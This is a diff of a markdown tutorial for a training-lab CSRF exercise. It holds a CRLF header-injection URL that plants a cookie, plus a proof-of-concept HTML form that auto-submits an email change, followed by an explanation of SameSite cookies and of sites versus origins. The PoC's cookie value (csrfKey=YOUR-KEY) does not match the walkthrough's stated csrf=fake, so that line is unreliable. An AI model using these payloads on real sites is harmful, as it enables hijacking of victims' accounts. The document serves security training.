@@ -468,9 +468,9 @@ Since the search function has no CSRF protection, you can use this to inject coo
 /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
 ```
 
-`%0d%0a` --- URL encoding for __carriage return (CR)__ and __line feed (LF)__ which is `\r\n` in ASCII. 
-`%3b` --- is __semicolon__ or `;`.
-`%20` --- is a __whitespace__.
+- `%0d%0a` --- URL encoding for __carriage return (CR)__ and __line feed (LF)__ which is `\r\n` in ASCII. 
+- `%3b` --- is __semicolon__ or `;`.
+- `%20` --- is a __whitespace__.
 
 _Decoded URL:_
 
@@ -520,5 +520,103 @@ csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
 In this setup, an attacker can still exploit the CSRF vulnerability if they can find any way to set a cookie in the victim's browser. The attacker doesn't even need a valid token --- they can generate a fake token, use a cookie-setting feature to plant it into the victim's browser, and include the same value in the CSRF payload. As long as both values match, the server will accept the request.
 
 ### Lab: CSRF where token is duplicated in cookie
+
+Open Burp's browser and log in with credentials `wiener:peter`. Submit the "Update email" form and find the resulting `POST /my-account/change-email` request in __Proxy__ > __History__. 
+
+Right-click the request and select "Send to Repeater". 
+
+The value of the `csrf` request body parameter is being validated simply by comparing it to the `csrf` cookie. To test against this, let's change `csrf` body parameter and send the request. Then give identical changed value to the `csrf` cookie as well and send the request. Compare the responses:
+
+In the first case:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 20
+
+"Invalid CSRF token"
+```
+
+In the second case:
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+So the hypothesis checks out. Now, let's perform a search on the web lab and send the resulting `GET /?search=anyterm` request to __Repeater__. The search term gets reflected in the Set-Cookie header of the response:
+
+```
+HTTP/2 200 OK
+Set-Cookie: LastSearchTerm=anyterm; Secure; HttpOnly
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3405
+```
+
+Since the search function has no CSRF protection, this can be used to inject cookies into the victim user's browser. Let's craft a URL that uses this vulnerability to inject a fake `csrf` cookie into the victim's browser:
+
+```
+/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
+```
+
+- `%0d%0a` --- URL encoding for __carriage return (CR)__ and __line feed (LF)__ which is `    \r\n` in ASCII.
+- `%3b` --- is __semicolon__ or `;`.
+- `%20` --- is a __whitespace__.
+
+Now let's create a proof of concept exploit as an HTML template, ensuring that CSRF input value is set to fake:
+
+```
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="obscure@email.com">
+    <input type="hidden" name="csrf" value="fake">
+</form>
+<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+```
+
+Make sure the email `input` value is not your own email. Click "Go to exploit server" and paste the above HTML in the "Body" section and click Store. If everything is alright, click "Deliver exploit to victim" to solve the lab. 
+
+> NOTE: Seeing as how similar this lab is to the previous one, the walkthrough of it in OWASP Zed Attack Proxy is unnecessary and hence, not included. 
+
+## Bypassing SameSite cookie restrictions
+
+SameSite is a browser-based security feature that controls when cookies are included in requests made from one site to another. It offers some protection against a range of cross-site attacks, including CSRF, data leakage between sites, and certain CORS-related exploits.
+
+As of 2021, Chrome automatically applies `SameSite=Lax` settings to cookies by default, unless the issuing site explicitly sets a different policy. This behavior is part of a proposed web standard, and it's expected that other major browsers will follow suit. Because of this, understanding how SameSite works --- and how attackers might bypass it --- is crucial for identifying and testing cross-site vulnerabilities effectively. 
+
+This section will explain the mechanics of the SameSite attribute, introduce key terms and explore common bypass techniques that can allow attackers to perform CSRF or other cross-site attacks even when initial defenses appear to be in place.
+
+## What is a site in the context of SameSite cookies?
+
+In the context of SameSite cookie restrictions, a "site" is defined by the top-level domain (TLD) such as `.com` or `.net`, combined with the immediate subdomain, more commonly referred to as __TLD+1__. For example, in `app.example.com` the site is considered `example.com`.
+
+When browsers determine whether a request is same-site or cross-site, they also take the URL scheme (HTTP vs HTTPS) into account. This means that even if the domain is the same, a request from `http://app.example.com` to `https://app.example.com` will usually be treated as cross-site. 
+
+!["Site Definition"](site-definition.png "Site Definition")
+
+> NOTE: You might encounter the term __effective top-level domain (eTLD)__, which accounts for multi-part suffixes used as TLDs in practice --- like `.co.uk`. So for `store.example.co.uk`, the effective site would be `example.co.uk`. 
+
+### What's the difference between a site and an origin?
+
+The key distcintion between a __site__ and an __origin__ lies in their __scope__. A __site__ can include several subdomains under the same base domain, while an origin is more precise, requiring an exact match of __scheme__, __domain__, and __port__. Although the two terms are related, they should not be used interchangeably --- doing so can lead to security oversights.
+
+Two URLs share the __same origin__ only if they match in all three components: scheme, domain name, and port (the port is usually assumed based on the scheme, like 443 for HTTPS). On the other hands, same-site checks are more lenient, focusing on the scheme and base domain (TLD+1), without requiring the port or subdomain to match.
+
+!["Site vs Origin"](site-vs-origin.png "Site vs Origin")
+
+The distinction is important because a request can be __same-site__ but not __same-origin__, which opens up potential for cross-origin vulnerabilities that bypass site-level protections. 
+
+| Request From             | Request To                  | Same-site? | Same-origin?                |
+|--------------------------|-----------------------------|------------|-----------------------------|
+| https://example.com      | https://example.com         | Yes        | Yes                         |
+| https://app.example.com  | https://intranet.example.com| Yes        | No (different subdomains)  |
+| https://example.com      | https://example.com:8080    | Yes        | No (different port)        |
+| https://example.com      | https://example.co.uk       | No         | No (different domain)      |
+| https://example.com      | http://example.com          | No         | No (different scheme)      |
+
+The difference matters, especially in scenarios where executing arbitrary JavaScript on one subdomain could allow an attacker to exploit protections on other subdomains within the same site. We'll explore an example of this in an upcoming lab. 
 
 
